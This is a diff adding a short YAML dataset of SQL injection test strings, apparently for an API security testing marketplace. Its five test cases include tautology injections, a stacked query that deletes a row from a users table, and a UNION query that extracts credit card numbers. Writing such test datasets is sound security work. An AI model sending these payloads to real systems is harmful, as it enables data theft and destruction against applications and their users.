@@ -1,0 +1,25 @@
+---
+
+authors:
+  - Mohammed Luqman Shareef
+
+type: DATASET
+
+publishToMarketplace: true
+
+description: SQL Injection Strings dataset.
+
+testCases:
+  - id: 1
+    body: '{"equals_true": "1' or '1' = '1"}'
+  - id: 2
+    body: '{"equals_true_brackets": "1' or '1' = '1'))/*"}'
+  - id: 3
+    body: '{"simple_select": "10 AND 1=1"}'
+  - id: 4
+    body: '{"stacked_queries": "10; DELETE FROM users where id=1"}'
+  - id: 5
+    body: '{"union_exploitation": "1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable"}'
+
+tags:
+  - DATASET
